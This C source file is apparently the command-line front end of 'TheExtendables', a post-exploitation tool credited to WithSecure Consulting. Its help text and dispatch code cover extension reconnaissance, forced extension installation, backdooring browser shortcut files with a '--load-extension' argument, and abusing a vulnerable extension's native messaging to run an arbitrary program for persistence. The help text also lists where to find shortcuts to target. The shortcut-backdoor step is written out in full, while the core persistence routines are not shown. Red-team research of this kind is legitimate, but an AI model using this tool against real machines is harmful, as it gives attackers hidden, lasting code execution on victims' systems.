#include "extendables.h"

//Function to print help options
int help() {
	printf("\n\n\nThis tool allows enumerating vulnerable extensions, installing new extensions and performing \"TheExtendables\" persistence.\n\n\n"
    
	"[+] Main Commands [+]\n[#]===============[#]\n"
	"/recon        - Perform reconaissance on installed extensions\n[OPTIONAL     - /verbose]\n\n"
	"/install      - Force installs an extension. REQUIRES ADMIN, Chrome or Edge only.\n[REQUIRED     - /extensionID]\n[OPTIONAL     - /browser, /allUsers, /verbose]\n\n"
	"/lnkTarget    - Retrieves the path and arguments of a supplied shortcut file\n[REQUIRED     - /lnkPath]\n\n"
	"/lnkBackdoor  - Backdoors a shortcut to a browser, Chrome or Edge only.\n[REQUIRED     - /lnkPath, /extensionPath]\n[OPTIONAL     - /browser]\nTaskbar shortcuts are stored within - %%APPDATA%%\\\\Microsoft\\\\Internet Explorer\\\\Quick Launch\\\\User Pinned\\\\TaskBar\nAlso make sure to check the desktop - %%HOMEPATH%%\\\\Desktop\nAnd a user's start menu - %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\nAnd all user's start menu - %PROGRAMDATA%\\Microsoft\\Windows\\Start Menu\\Programs\n\n"
	"/persist      - Exploits a vulnerable extension to run arbitrary code through it\n[REQUIRED     - /extensionID, /extensionName, /targetPath]\n[OPTIONAL     - /browser, /allUsers, /verbose, /nativePath, /description, /force]\n\n\n"
	
	"[+] Arguments [+]\n[#]===========[#]\n"
	"(All below take arguments apart from /verbose and /force)\n\n"
	"/extensionID   - Identifier string for the extension, eg. anffbmbabbpmcaflbelkkhgdcfgppknb\n"
	"/extensionName - Internal name of the extension, eg. com.companyName.extensionsName\n"
	"/targetPath    - Path of exe or file with default app mapped, to run. eg. C:\\\\windows\\\\system32\\\\calc.exe\n"
	"/browser       - Browser to target: Chrome, Edge or Firefox. Default = Chrome\n"
	"/allUsers      - Install in HKLM or HKCU. user = HKCU, machine = HKLM (only works if admin). Default = user\n"
	"/nativePath    - Path for native.json to be saved to. Default = C:\\\\ProgramData\\\\native.json\n"
	"/description   - Description of extension in native.json. Default - This is an extension that extends browser functionality\n"
	"/lnkPath       - Path to shortcut file to retrieve target or backdoor. eg. %%HOMEPATH%%\\Desktop\\Google Chrome.lnk\n"
	"/extensionPath - Path to unpacked extension. eg. C:\\\\ProgramData\\\\\n"
	"/verbose       - Adds additional verbosity to output (Takes no argument)\n"
	"/force         - Ignore any mutex to edit or replace old payload (Takes no argument)\n\n\n"

	"[+] Examples [+]\n[#]==========[#]\n\n"
	"Example: TheExtendables.exe /recon /verbose\n"
	"Example: TheExtendables.exe /install /extensionID anffbmbabbpmcaflbelkkhgdcfgppknb\n"
	"Example: TheExtendables.exe /lnkTarget /lnkPath \"%%HOMEPATH%%\\\\Desktop\\\\Google Chrome.lnk\"\n"
	"Example: TheExtendables.exe /lnkBackdoor /lnkPath \"%%HOMEPATH%%\\\\Desktop\\\\Google Chrome.lnk\" /extensionPath C:\\\\ProgramData\\\\extension\\\\\n"
	"Example: TheExtendables.exe /persist /extensionID anffbmbabbpmcaflbelkkhgdcfgppknb /extensionName com.companyName.extensionsName /targetPath C:\\\\windows\\\\system32\\\\calc.exe\n");
	return 0;
}

//Main function
int main(int argc, char* argv[])
{
	//Ascii art for name
	printf(" _____ _            _____     _                 _       _     _           \n"
	"|_   _| |          |  ___|   | |               | |     | |   | |          \n"
	"  | | | |__   ___  | |____  _| |_ ___ _ __   __| | __ _| |__ | | ___  ___ \n"
	"  | | | '_ \\ / _ \\ |  __\\ \\/ / __/ _ \\ '_ \\ / _` |/ _` | '_ \\| |/ _ \\/ __|\n"
	"  | | | | | |  __/ | |___>  <| ||  __/ | | | (_| | (_| | |_) | |  __/\\__ \\\n"
	"  \\_/ |_| |_|\\___| \\____/_/\\_\\\\__\\___|_| |_|\\__,_|\\__,_|_.__/|_|\\___||___/\n"
	"\nBy WithSecure Consulting\n\n"
	"\n(ASCII art from: http://www.patorjk.com/software/taag/)\n");

	int recon = 0;
	int install = 0;
	int lnkTarget = 0;
	int lnkBackdoor = 0;
	int persist = 0;
	int error = 0;
	int verbose = 0;
	char* extensionId = (char*)"";
	char* browser = (char*)"chrome";
	char* allUsers = (char*)"user";
	char* extensionName = (char*)"";
	char* targetPath = (char*)"";
	char* nativePath = (char*)"C:\\ProgramData\\native.json";
	char* description = (char*)"This is an extension that extends browser functionality";
	char* force = (char*)"";
	char* lnkPath = (char*)"";
	char* extensionPath = (char*)"";

	//If less than two arguments are provided, show the help menu
	if (argc < 2) {
		help();
	}
	else {
		
		//Loop through command line args and set supplied values
		for (int i = 1; i < argc; i++)
		{
			char* argData = argv[i];

			//Convert everything to lowercase, to make args case insensitive
			for (int x = 0; x < strlen(argv[i]); x++) {

				argData[x] = tolower(argData[x]);
			}


			//Check arguments supplied against defined ones
			if ((strcmp(argData, "/recon") == 0) || (strcmp(argData, "--recon") == 0) || (strcmp(argData, "-recon") == 0)) {
				recon = 1;
			}

			else if ((strcmp(argData, "/install") == 0) || (strcmp(argData, "--install") == 0) || (strcmp(argData, "-install") == 0)) {
				install = 1;
			}

			else if ((strcmp(argData, "/lnktarget") == 0) || (strcmp(argData, "--lnktarget") == 0) || (strcmp(argData, "-lnktarget") == 0)) {
				lnkTarget = 1;
			}

			else if ((strcmp(argData, "/lnkbackdoor") == 0) || (strcmp(argData, "--lnkbackdoor") == 0) || (strcmp(argData, "-lnkbackdoor") == 0)) {
				lnkBackdoor = 1;
			}

			else if ((strcmp(argData, "/persist") == 0) || (strcmp(argData, "--persist") == 0) || (strcmp(argData, "-persist") == 0)) {
				persist = 1;
			}

			else if ((strcmp(argData, "/extensionid") == 0) || (strcmp(argData, "--extensionid") == 0) || (strcmp(argData, "-extensionid") == 0)) {
				extensionId = argv[i + 1];
				i++;
			}
			else if ((strcmp(argData, "/browser") == 0) || (strcmp(argData, "--browser") == 0) || (strcmp(argData, "-browser") == 0)) {
				browser = argv[i + 1];
				i++;
			}
			else if ((strcmp(argData, "/allusers") == 0) || (strcmp(argData, "--allusers") == 0) || (strcmp(argData, "-allusers") == 0)) {
				allUsers = argv[i + 1];
				i++;
			}

			else if ((strcmp(argData, "/extensionname") == 0) || (strcmp(argData, "--extensionname") == 0) || (strcmp(argData, "-extensionname") == 0)) {
				extensionName = argv[i + 1];
				i++;
			}

			else if ((strcmp(argData, "/targetpath") == 0) || (strcmp(argData, "--targetpath") == 0) || (strcmp(argData, "-targetpath") == 0)) {
				targetPath = argv[i + 1];
				i++;
			}

			else if ((strcmp(argData, "/nativepath") == 0) || (strcmp(argData, "--nativepath") == 0) || (strcmp(argData, "-nativepath") == 0)) {
				nativePath = argv[i + 1];
				i++;
			}

			else if ((strcmp(argData, "/description") == 0) || (strcmp(argData, "--description") == 0) || (strcmp(argData, "-description") == 0)) {
				description = argv[i + 1];
				i++;
			}

			else if ((strcmp(argData, "/force") == 0) || (strcmp(argData, "--force") == 0) || (strcmp(argData, "-force") == 0)) {
				force = (char*)"force";
			}

			else if ((strcmp(argData, "/verbose") == 0) || (strcmp(argData, "--verbose") == 0) || (strcmp(argData, "-verbose") == 0) || (strcmp(argData, "/v") == 0) || (strcmp(argData, "--v") == 0) || (strcmp(argData, "-v") == 0)) {
				verbose = 1;
			}

			else if ((strcmp(argData, "/lnkpath") == 0) || (strcmp(argData, "--lnkpath") == 0) || (strcmp(argData, "-lnkpath") == 0)) {
				lnkPath = argv[i + 1];
				i++;
			}

			else if ((strcmp(argData, "/extensionpath") == 0) || (strcmp(argData, "--extensionpath") == 0) || (strcmp(argData, "-extensionpath") == 0)) {
				extensionPath = argv[i + 1];
				i++;
			}

			else {
				printf("[-] An error occured! Argument %s is not recognised!\n", argData);
				error = 1;
			}
			
		}

		

		//If there is an error send message and end execution
		if (error == 1) {
			
			help();
			return 1;
		}

		//If no errors, continue with execution
		else {
			//If recon is specified, do the recon
			if (recon == 1) {
				extensionRecon(verbose);
			}

			//If install extension is specified, check required arguments are specified, error if needed, then do the installation
			if (install == 1) {
				if (extensionId == NULL || (strcmp(extensionId, "") == 0)) {
					printf("[-] An error occured! An extension ID was not specified to install!\n");
					help();
					return 1;
				}
				else {
					extensionInstall(extensionId, browser, allUsers,verbose);
				}
			}

			//If retrieve shortcut path is specified, check required arguments are specified, error if needed, then return path and arguments of LNK
			if (lnkTarget == 1) {
				if (lnkPath == NULL || (strcmp(lnkPath, "") == 0)) {
					printf("[-] An error occured! An LNK path was not specified!\n");
					help();
					return 1;
				}
				else {
					shortcutGetArgs(lnkPath);
				}
			}

			//If LNK backdoor is specified, check required arguments are specified, error if needed, then append commandline args to specified shortcut
			if (lnkBackdoor == 1) {
				if (lnkPath == NULL || (strcmp(lnkPath, "") == 0)) {
					printf("[-] An error occured! An LNK path was not specified!\n");
					help();
					return 1;
				}
				else if (extensionPath == NULL || (strcmp(extensionPath, "") == 0)) {
					printf("[-] An error occured! An extension path was not specified!\n");
					help();
					return 1;
				}
				else {
					if((strcmp(browser, "chrome") == 0)||(strcmp(browser, "edge") == 0)){
						char* fullArgs = (char*)calloc(1, MAX_PATH);
						strcat_s(fullArgs, MAX_PATH, "--load-extension=");
						strcat_s(fullArgs, MAX_PATH, extensionPath);
						shortcutEdit(lnkPath, fullArgs);
						
					}
					else{
						shortcutEdit(lnkPath, extensionPath);
					}
				}
			}

			//If persist is specified, check required arguments are specified, error if needed, then do the persistence of the commandline
			if (persist == 1) {
				if (extensionId == NULL || (strcmp(extensionId, "") == 0)){
					printf("[-] An error occured! An extension ID was not specified to install!\n");
					help();
					return 1;
				}
				else if (extensionName == NULL || (strcmp(extensionName, "") == 0)) {
					printf("[-] An error occured! An extension name was not specified to install!\n");
					help();
					return 1;
				}
				else if (targetPath == NULL || strcmp(targetPath, "") == 0) {
					printf("[-] An error occured! A target path was not specified to install!\n");
					help();
					return 1;
				}
				else {
					extendablesPersist(extensionId, extensionName, targetPath, browser, nativePath, allUsers, description, force,verbose);
				}
			}
		}
	}

	return 0;
}
